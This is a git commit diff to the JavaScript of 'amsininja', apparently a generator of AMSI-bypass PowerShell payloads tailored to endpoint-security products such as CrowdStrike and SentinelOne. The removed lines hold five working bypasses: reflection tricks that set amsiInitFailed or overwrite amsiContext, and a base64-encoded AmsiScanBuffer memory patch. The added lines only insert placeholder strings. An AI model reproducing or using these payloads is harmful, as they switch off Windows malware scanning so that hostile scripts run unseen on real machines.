1e598f8dc6bc72f24acb8ea921a02faab91ff5a1
Amit Mor <125692780+Extravenger@users.noreply.github.com>
2025-05-17 17:32:11 +0300

    Update codeScript.js

--- amsininja/js/codeScript.js
+++ amsininja/js/codeScript.js
@@ -14,15 +14,7 @@ function randomInt(max) {
 }
 
 function getPayload(edr) {
-    let memvar = randomString(3 + randomInt(7)); // Random variable name of length 3 to 10
-
-    // Existing payloads for Random selection
-    const ForceErrer = `#Unknown - Force error \n$${memvar}=[System.Runtime.InteropServices.Marshal]::AllocHGlobal(9076);[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiSession", "NonPublic,Static").SetValue($null, $null);[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiContext", "NonPublic,Static").SetValue($null, [IntPtr]$${memvar});`;
-    const MattGRefl = `#Matt Graebers Reflection method \n$${memvar}="System.Management.Automation.AmsiUtils";[Ref].Assembly.GetType($${memvar}).GetField('amsiInitFailed',"NonPublic,Static").SetValue($null,$true);`;
-    const MattGReflLog = `#Matt Graebers Reflection method with WMF5 autologging bypass \n$${memvar}="System.Management.Automation.AmsiUtils";[Delegate]::CreateDelegate(("Func\`\`3[String, $(([String].Assembly.GetType('System.Reflection.BindingFlags')).FullName), System.Reflection.FieldInfo]" -as [String].Assembly.GetType('System.Type')), [Object]([Ref].Assembly.GetType($${memvar})),('GetField')).Invoke('amsiInitFailed',(("NonPublic,Static") -as [String].Assembly.GetType('System.Reflection.BindingFlags'))).SetValue($null,$True);`;
-    const MattGref02 = `#Matt Graebers second Reflection method \n$${memvar}="System.Management.Automation.AmsiUtils";[Runtime.InteropServices.Marshal]::("WriteInt32")([Ref].Assembly.GetType($${memvar}).GetField("amsiContext",[Reflection.BindingFlags]"NonPublic,Static").GetValue($null),0x${randomInt(2147483647).toString(16)});`;
-    const RastaBuf = atob("I1Jhc3RhLW1vdXNlcyBBbXNpLVNjYW4tQnVmZmVyIHBhdGNoIFxuDQokV2luMzIgPSBAIg0KdXNpbmcgU3lzdGVtOw0KdXNpbmcgU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzOw0KcHVibGljIGNsYXNzIFdpbjMyIHsNCiAgICBbRGxsSW1wb3J0KCJrZXJuZWwzMiIpXQ0KICAgIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIEludFB0ciBHZXRQcm9jQWRkcmVzcyhJbnRQdHIgaE1vZHVsZSwgc3RyaW5nIHByb2NOYW1lKTsNCiAgICBbRGxsSW1wb3J0KCJrZXJuZWwzMiIpXQ0KICAgIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIEludFB0ciBMb2FkTGlicmFyeShzdHJpbmcgbmFtZSk7DQogICAgW0RsbEltcG9ydCgia2VybmVsMzIiKV0NCiAgICBwdWJsaWMgc3RhdGljIGV4dGVybiBib29sIFZpcnR1YWxQcm90ZWN0KEludFB0ciBscEFkZHJlc3MsIFVJbnRQdHIgZHdTaXplLCB1aW50IGZsTmV3UHJvdGVjdCwgb3V0IHVpbnQgbHBmbE9sZFByb3RlY3QpOw0KfQ0KIkANCg0KQWRkLVR5cGUgJFdpbjMyDQoNCiRMaWJMb2FkID0gW1dpbjMyXTo6TG9hZExpYnJhcnkoImFtc2kuZGxsIikNCiRNZW1BZHIgPSBbV2luMzJdOjpHZXRQcm9jQWRkcmVzcygkTGliTG9hZCwgIkFtc2lTY2FuQnVmZmVyIikNCiRwID0gMA0KW1dpbjMyXTo6VmlydHVhbFByb3RlY3QoJE1lbUFkciwgW3VpbnQzMl01LCAweDQwLCBbcmVmXSRwKQ0KJHZhcjEgPSAiMHhCOCINCiR2YXIyID0gIjB4NTciDQokdmFyMyA9ICIweDAwIg0KJHZhcjQgPSAiMHgwNyINCiR2YXI1ID0gIjB4ODAiDQokdmFyNiA9ICIweEMzIg0KJFBhdGNoID0gW0J5dGVbXV0gKCR2YXIxLCR2YXIyLCR2YXIzLCR2YXI0LCskdmFyNSwrJHZhcjYpDQpbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpDb3B5KCRQYXRjaCwgMCwgJE1lbUFkciwgNik=");
-
+    
     // EDR-specific payloads
     const crowdStrikePayload = `function Find-Core($ModuleName, $FunctionName) {
     $Assembly = ([AppDomain]::CurrentDomain.GetAssemblies() | ? { $_.GlobalAssemblyCache -and $_.Location.EndsWith('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
@@ -59,6 +51,7 @@ if ($s -eq 8) {
     const microsoftXDRPayload = `#MicrosoftXDR AMSI Bypass (Placeholder)`;
     const sentinelOnePayload = `#SentinelOne AMSI Bypass (Placeholder)`;
     const cortexPayload = `#Cortex AMSI Bypass (Placeholder)`;
+    const carbonBlackPayload = `#carbonBlack AMSI Bypass (Placeholder)`;
 
     switch (edr) {
         case 'CrowdStrike':
@@ -67,21 +60,9 @@ if ($s -eq 8) {
             return microsoftXDRPayload;
         case 'SentinelOne':
             return sentinelOnePayload;
-        case 'Defender':
+        case 'Cortex':
             return cortexPayload;
-        case 'Random':
-        default:
-            switch (randomInt(4)) {
-                case 0:
-                    return ForceErrer;
-                case 1:
-                    return MattGRefl;
-                case 2:
-                    return MattGReflLog;
-                case 3:
-                    return MattGref02;
-                case 4:
-                    return RastaBuf;
-            }
+        case 'CarbonBlack':
+            return carbonBlackPayload;
     }
 }
